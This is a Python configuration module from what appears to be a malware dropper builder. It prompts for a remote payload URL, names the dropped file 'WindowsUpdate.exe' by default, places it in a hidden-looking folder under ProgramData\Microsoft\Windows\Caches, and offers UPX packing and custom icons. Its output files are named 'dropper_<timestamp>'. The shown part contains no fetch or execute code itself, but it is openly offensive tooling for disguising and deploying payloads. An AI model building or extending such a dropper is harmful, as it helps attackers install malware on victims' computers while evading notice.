#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Config module - collection, loading, validation, review.
"""

import os
import sys
import json
from datetime import datetime

from .ui import C, box_header, box_panel, info, success, warn, error, blank
from .utils import get_input, get_yes_no, validate_config


# ============================================================
# DEFAULTS
# ============================================================
DEFAULTS = {
    "EXE_URL": "",
    "FINAL_NAME": "WindowsUpdate.exe",
    "EXEC_FOLDER": r"%ProgramData%\Microsoft\Windows\Caches",
    "OUTPUT_NAME": None,   # generated at runtime
    "ICON": "",
    "UPX": False,
}


# ============================================================
# INTERACTIVE COLLECTION
# ============================================================
def collect_config():
    """Interactively collect config from user."""
    blank()
    box_header("PAYLOAD SETTINGS")

    exe_url = get_input("  Payload URL (e.g., http://localhost:8080/payload.exe)")
    final_name = get_input("  Final filename on target", default=DEFAULTS["FINAL_NAME"])
    exec_folder = get_input("  Execution folder", default=DEFAULTS["EXEC_FOLDER"])

    blank()
    box_header("OUTPUT SETTINGS")

    default_out = f"dropper_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
    output_name = get_input("  Output .exe name (without .exe)", default=default_out)

    blank()
    box_header("BUILD OPTIONS")

    icon_path = get_input("  Icon path (.ico, blank for none)", default="", required=False)
    use_upx = get_yes_no("  Compress with UPX", default="n")

    return {
        "EXE_URL": exe_url,
        "FINAL_NAME": final_name,
        "EXEC_FOLDER": exec_folder,
        "OUTPUT_NAME": output_name,
        "ICON": icon_path,
        "UPX": use_upx,
    }


# ============================================================
# CONFIG FILE LOADING
# ============================================================
def load_config_file(path):
    """Load config from JSON file."""
    try:
        with open(path, "r", encoding="utf-8") as f:
            data = json.load(f)

        # Strip underscore-prefixed keys
        clean = {k: v for k, v in data.items() if not k.startswith("_")}

        # Fill defaults for missing fields
        config = {
            "EXE_URL": clean.get("EXE_URL", ""),
            "FINAL_NAME": clean.get("FINAL_NAME", DEFAULTS["FINAL_NAME"]),
            "EXEC_FOLDER": clean.get("EXEC_FOLDER", DEFAULTS["EXEC_FOLDER"]),
            "OUTPUT_NAME": clean.get("OUTPUT_NAME") or
                           f"dropper_{datetime.now().strftime('%Y%m%d_%H%M%S')}",
            "ICON": clean.get("ICON", ""),
            "UPX": bool(clean.get("UPX", False)),
        }
        return config

    except FileNotFoundError:
        error(f"Config not found: {path}")
        sys.exit(1)
    except json.JSONDecodeError as e:
        error(f"Invalid JSON in config: {e}")
        sys.exit(1)
    except Exception as e:
        error(f"Failed to load config: {e}")
        sys.exit(1)


def apply_overrides(config, args):
    """Apply CLI overrides to config."""
    if getattr(args, "url", None):
        config["EXE_URL"] = args.url
    if getattr(args, "name", None):
        config["OUTPUT_NAME"] = args.name
    return config


# ============================================================
# REVIEW
# ============================================================
def review_config(config):
    """Display config summary."""
    rows = [
        ("Payload URL", config["EXE_URL"]),
        ("Target Name", config["FINAL_NAME"]),
        ("Target Folder", config["EXEC_FOLDER"]),
        ("Output Name", config["OUTPUT_NAME"] + ".exe"),
        ("Icon", config["ICON"] if config["ICON"] else "(none)"),
        ("UPX Compress", "YES" if config["UPX"] else "NO"),
    ]
    box_panel("CONFIGURATION SUMMARY", rows)


def validate_or_exit(config):
    """Validate config, print errors if invalid."""
    ok, errors = validate_config(config)
    if not ok:
        error("Config validation failed:")
        for e in errors:
            print(f"    {C.RED}• {e}{C.RESET}")
        sys.exit(1)
    return True